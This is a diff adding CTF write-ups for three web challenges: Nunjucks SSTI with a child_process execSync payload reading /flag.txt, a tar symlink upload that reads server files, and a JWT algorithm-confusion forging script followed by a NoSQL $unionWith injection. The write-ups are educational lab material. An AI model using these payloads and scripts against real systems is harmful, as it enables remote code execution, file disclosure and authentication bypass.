@@ -84,13 +84,254 @@ And we get our flag:
 ###### 116pts - 19 solves
 > Tjek her, om dine strenge er palindromer!
 
+When opening the webste we are greeted with the following screen:
+![Templatetrap homepage](/src/assets/DDC25National/templatetrap.png)
+
+And we are also given the source:
+```js
+const express = require("express");
+const nunjucks = require("nunjucks");
+
+const app = express();
+nunjucks.configure("views", {
+  autoescape: true,
+  express: app,
+});
+
+app.get("/", function (req, res) {
+  const input = req.query.value || "";
+  if (!input) {
+    return res.render("index.html", { message: "Please provide an input" });
+  }
+  if (input.includes(" ")) {
+    return res.render("index.html", { message: "Sorry, we only accept space-free palindromes here!" });
+  }
+  const reversed = [...input].reverse().join("");
+  let message = "";
+  if (input && input === reversed) {
+    message = nunjucks.renderString((str = reversed + " is a very nice palindrome"));
+  } else if (input) {
+    message = nunjucks.renderString((str = "You string reversed is not a palindrome: " + reversed));
+  }
+  
+  return res.render("index.html", { message: message });
+});
+
+const server = app.listen(process.env.PORT || 80, () => {
+  console.log(`Server started on port: ${server.address().port}`);
+});
+```
+
+Here we can see that it uses nunjucks and reverses our input. The call to ``nunjucks.renderString`` with our input allows us to perform SSTI.
+
+We do however, need to have a payload without any spaces. For this I ended up with the following payload:
+```js
+{{range.constructor(\"return(global.process.mainModule.require('child_process').execSync('cat${IFS}/flag.txt'))\")()}}
+```
+
+In order to properly reverse the output I made a simple js script:
+```js
+const input = "{{range.constructor(\"return(global.process.mainModule.require('child_process').execSync('cat${IFS}/flag.txt'))\")()}}"
+const reversed = [...input].reverse().join("")
+console.log(reversed)
+```
+
+Which gives:
+```js
+}})()"))'txt.galf/}SFI{$tac'(cnyScexe.)'ssecorp_dlihc'(eriuqer.eludoMniam.ssecorp.labolg(nruter"(rotcurtsnoc.egnar{{
+```
+
+Inputting this on the website gets us the flag:
+``DDC{templating-gone-wrong} ``
+
+![Flag screen for template trap](/src/assets/DDC25National/templateFlag.png)
+
 ### Photo Album
 ###### 100pts - 25 solves
 > Upload dine billeder!
 
+Upon visiting the page we can see that we are able to upload a ``TAR`` file:
+![Photo Album homepage](/src/assets/DDC25National/photoAlbum.png)
+
+By looking into the source we can find the interesting upload function:
+```py
+@app.route("/", methods=["GET", "POST"])
+def upload_file():
+    if request.method == "POST":
+        if "file" not in request.files:
+            return "No file uploaded!", 400
+
+        file = request.files["file"]
+        if not allowed_file(file.filename):
+            return "📸 Sorry, this isn't a file-sharing site for random files. **JPEGs, PNGs, or TARs with images only!** 🛑", 400
+
+        file_ext = os.path.splitext(file.filename)[1].lower()
+        file_path = os.path.join(UPLOAD_FOLDER, file.filename)
+        file.save(file_path)
+
+        if file_ext == ".tar":
+            if not has_only_images_in_tar(file_path):
+                os.remove(file_path)
+                return "🤔 Hmmm... This doesn't look like an image. Try again with something *less suspicious*... 👀", 400
+
+            try:
+                with tarfile.open(file_path, "r") as tar_ref:
+                    tar_ref.extractall(EXTRACT_FOLDER)
+                return render_template("success.html")
+            except Exception as e:
+                return f"Extraction failed: {str(e)}", 500
+        else:
+            os.rename(file_path, os.path.join(EXTRACT_FOLDER, file.filename))
+            return render_template("success.html")
+    return render_template("index.html")
+```
+
+This allows for us to use the zipslip vulnerability to read the flag. In order to do this we can create a fake image file and symlink it to the flag.
+In order to do this I wrote a small script:
+```py
+import tarfile
+import os
+
+# Make a tar with a symlink that looks like an image file
+with tarfile.open("exploit.tar", "w") as tar:
+    # Create a symlink entry named 'exploit.jpg' pointing to '/flag'
+    info = tarfile.TarInfo(name="exploit.jpg")
+    info.type = tarfile.SYMTYPE
+    info.linkname = "/flag.txt"  # Path to the real flag on server
+    tar.addfile(info)
+```
+
+After uploading it we can then navigate to <http://photo-album.hkn/static/albums/exploit.jpg> to get the flag. Usually a browser will fail to render the image as it only contains the flag.
+Instead we can just send a request in a proxy like Burpsuite and we can see the flag in the response:
+![Flag for Photo Album](/src/assets/DDC25National/albumFlag.png)
+
+``DDC{f4k3_im4g3_r34l_fl4g}``
+
 ### BugTracker
 ###### 100pts - 25 solves
 > Her er vores bugtracker - hvor vi har helt styr på næsten alle fejl.
+
+This challenge uses JWTs to handle authentication. There is however a small flaw in the validation of these:
+```py
+def generate_jwt(username, role, algorithm="RS256"):
+    payload = {
+        "username": username,
+        "role": role,
+        "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
+    }
+    if algorithm == "RS256":
+        token = jwt.encode(
+            payload,
+            SKEY,
+            algorithm="RS256"
+        )
+    elif algorithm == "HS256":
+        token = jwt.encode(
+            payload,
+            SKEY,
+            algorithm="HS256"
+        )
+    else:
+        raise ValueError(f"Unsupported algorithm: {algorithm}")
+    return token
+
+def decode_jwt(token):
+    header = jwt.get_unverified_header(token)
+    alg = header.get("alg")
+
+    if alg == "HS256":
+        key_obj = serialization.load_pem_public_key(
+            KEY,
+            backend=default_backend()
+        )
+        raw_key_bytes = key_obj.public_bytes(
+            encoding=serialization.Encoding.DER,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo
+        )
+
+        return jwt.decode(
+            token,
+            key=raw_key_bytes,
+            algorithms=["HS256"],
+            options={"verify_aud": False}
+        )
+    elif alg == "RS256":
+        return jwt.decode(
+            token,
+            key=KEY,
+            algorithms=["RS256"],
+            options={"verify_aud": False}
+        )
+    else:
+        raise ValueError(f"Unsupported alg: {alg}")
+```
+
+Which allows us to perform a JWT algorithm confusion attack. To start off we need to sign up and login as any user. Then get the JWT token from local storage. After this we can simply paste the token into the solve script below:
+
+```py
+import base64
+import json
+import hmac
+import hashlib
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+
+KEY = b"""-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu312Aqc7m8puqI5i0mm4
++CdBRYRmccFwJme1qHVAc0RcIPSS6k3hJ/WZJgQyDuTt/DUtYb2pbVTzIso3v5HR
+FodZ8zZdqHLBF+V8uVluwXGyjw5i7mpBS8PJQMMIL3tEPmYB21KKF1cfkMbDYE6S
+r8BchYraXnAtLj+w6w1rzTOEYsqbktCq29xXTWU8+E+mOUYKHS8n8olyPEBfiaHY
+fy7nUt+uMrUXxayrTWMi7HduFq4ZW7kUnH66koTo26x+HuhHuh9lhIdVLKmB64Yq
+Kyt88r1XOAXI9cMVQZqdRuGbYSg8UgLE1mzqxkAzv0E6hITTJYQdCTAiuUX1Dj1M
+bwIDAQAB
+-----END PUBLIC KEY-----"""
+
+key_obj = serialization.load_pem_public_key(
+            KEY,
+            backend=default_backend()
+        )
+raw_key_bytes = key_obj.public_bytes(
+            encoding=serialization.Encoding.DER,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo
+        )
+
+def jwt_alg_confusion(token, new_payload, public_key):
+    public_key = raw_key_bytes
+    header, payload, signature = token.split(".")
+    header = json.loads(base64.urlsafe_b64decode(header).decode())
+    header["alg"] = header["alg"].replace("RS", "HS")
+    header = base64.urlsafe_b64encode(json.dumps(header).encode()).strip(b"=")
+    
+    new_payload = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).strip(b"=")
+    new_signature = base64.urlsafe_b64encode(hmac.HMAC(public_key, b'.'.join([header, new_payload]), hashlib.sha256).digest()).strip(b"=")
+    
+    return b'.'.join([header, new_payload, new_signature]).decode()
+
+def solve():
+    public_key = open("public_key.pem").read()
+    new_token = jwt_alg_confusion("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF1YWNrIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NDY5MDk2ODB9.PFELiAt8HOJl4OJevczHJ7hRyB20XKVlDFoOFGSShgD4rdAycjrq27mmJwwWeKcIcni2Pqyna-y3Cb-7-LC54kWxKNI33epNd6cVI043GKw3iCTr-MLGD4-zrpe_tREDptJrgo2wAhVMmeqNMchB4xu3Sq1QsOY1Wl62nnIlpm8ABDZ8B_4HXxhv1L4q0gWisPG0M2KYXcM24HmGjoUj1R16Tx0uea7XxzB5udQ6ralGAvUX7t9nXKMmEEnYAu9NMUWpDGbKZFToeY90Ww2tBEdnZU5tb7LTXLNDhJ0HeY0Cgcgf14c_0TidGUGaaT47b0CAygZtj9NmWnmPxnqc1g", {
+  "username": "admin_user",
+  "role": "admin",
+  "exp": 1746909680 
+}, public_key)
+    print(new_token)
+
+if __name__ == "__main__":
+    solve()
+```
+
+This allows us to sign our forged token using the public key. Therefore we can login as admin:
+
+![Admin page of bug tracker](/src/assets/DDC25National/bugAdmin.png)
+
+On the admin page we can query the database. By just querying anything and going to the proxy/network history we can see a call like ``/admin_search?query=``.
+In order to get the flag we can perform NoSQL injection here and extract the flag using the following payload:
+``[{"$unionWith": "flags"}]`` that we then need to URL encode to ``/admin_search?query=%5B%7B%22%24unionWith%22%3A%20%22flags%22%7D%5D``
+
+And this gets us the flag: ``DDC{c0nfu53d_4nd_vuln3r4bl3}``
+![Flag for bug tracker](/src/assets/DDC25National/bugFlag.png)
+
+
 
 ### EvilPlot Parking Group
 ###### 142pts - 17 solves
